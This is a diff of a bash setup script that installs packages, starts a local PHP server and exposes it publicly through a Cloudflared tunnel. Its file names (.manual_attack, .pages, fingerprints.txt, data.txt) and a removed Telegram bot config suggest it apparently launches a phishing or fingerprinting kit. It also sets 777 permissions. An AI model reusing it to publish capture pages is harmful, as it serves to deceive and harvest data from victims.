@@ -1,7 +1,55 @@
 #!/bin/bash
 
-# Function to install necessary packages and tunnels if not already installed
-install_packages_and_tunnels() {
+RED="$(printf '\033[31m')"  
+GREEN="$(printf '\033[32m')"  
+ORANGE="$(printf '\033[33m')"  
+BLUE="$(printf '\033[34m')"
+MAGENTA="$(printf '\033[35m')"  
+CYAN="$(printf '\033[36m')"  
+WHITE="$(printf '\033[37m')" 
+BLACK="$(printf '\033[30m')"
+
+install_packages() {
+    echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."
+
+    if [[ -d "/data/data/com.termux/files/home" ]]; then
+        if [[ $(command -v proot) ]]; then
+            printf ''
+        else
+            echo -e "\n${GREEN}[${WHITE}+${GREEN}]${MAGENTA} Installing package : ${CYAN}proot${CYANMAGENTA}"${WHITE}
+            pkg install proot resolv-conf -y
+        fi
+    fi
+
+    if [[ $(command -v php) && $(command -v wget) && $(command -v curl) && $(command -v unzip) ]]; then
+        echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Mip packages already installed." 
+        sleep 1
+    else
+        echo -e "\n${GREEN}[${WHITE}+${GREEN}]${MAGENTA} Installing required packages..."${WHITE}
+        
+        if [[ $(command -v pkg) ]]; then
+            pkg install figlet php curl wget unzip mpv -y
+        elif [[ $(command -v apt) ]]; then
+            apt install figlet php curl wget unzip mpv -y
+        elif [[ $(command -v apt-get) ]]; then
+            apt-get install figlet php curl wget unzip mpv -y
+        elif [[ $(command -v pacman) ]]; then
+            sudo pacman -S figlet php curl wget unzip mpv --noconfirm
+        elif [[ $(command -v dnf) ]]; then
+            sudo dnf -y install figlet php curl wget unzip mpv
+        else
+            echo -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager, Install packages manually."
+            { sleep 2; exit 1; }
+        fi
+    fi
+}
+
+setup_clone_and_start_server() {
+    mkdir -p .www  # Ensure .www directory exists
+    cd .www && php -S 127.0.0.1:8080 > /dev/null 2>&1 &
+}
+
+install_tunnels_and_setup() {
     if [[ -f .host/cloudflared ]]; then
         clear
     else
@@ -14,56 +62,14 @@ install_packages_and_tunnels() {
             ./tunnels.sh
         fi
     fi
+    
 }
 
-# Function to check if the script is run as root on non-Android systems
-check_root_and_os() {
-    if [[ $(uname -o) != Android && ${EUID:-$(id -u)} -ne 0 ]]; then
-        clear
-        echo -e "The program cannot run.\nFor GNU/Linux systems, please run as root.\n"
-        exit 1
-    fi
-}
-
-# Function to set permissions for necessary files and directories
 set_permissions() {
     chmod -R 777 packages.sh tunnels.sh data.txt fingerprints.txt .host .manual_attack .music .pages .tunnels_log .www
 }
 
-# Function to create necessary directories
-create_directories() {
-    mkdir -p .tunnels_log .www
-}
 
-# Function to create or update configuration file
-create_or_update_config() {
-    config_file=".www/config.ini"
-    if [[ -f $config_file ]]; then
-        read -p "config.ini already exists. Do you want to update it? (y/n): " choice
-        if [[ $choice != "y" ]]; then
-            echo "Config update skipped."
-            return
-        fi
-    fi
-
-    read -p "Enter your Telegram bot token: " token
-    read -p "Enter your Telegram chat ID: " chat_id
-
-    cat <<EOL >$config_file
-[telegram]
-token = $token
-chat_id = $chat_id
-EOL
-
-    echo "Config file created/updated successfully."
-}
-
-# Function to start PHP server
-start_php_server() {
-    cd .www && php -S 127.0.0.1:8080 > /dev/null 2>&1 &
-}
-
-# Function to start Cloudflared tunnel
 start_cloudflared() {
     echo -ne "\nStarting Cloudflared..."
     if [[ $(command -v termux-chroot) ]]; then
@@ -77,11 +83,8 @@ start_cloudflared() {
     echo -e "\nCloudflared URL: ${cldflr_url}"
 }
 
-# Main script execution
-install_packages_and_tunnels
-check_root_and_os
-create_directories
+install_packages
+install_tunnels_and_setup
 set_permissions
-create_or_update_config
-start_php_server
+setup_clone_and_start_server
 start_cloudflared
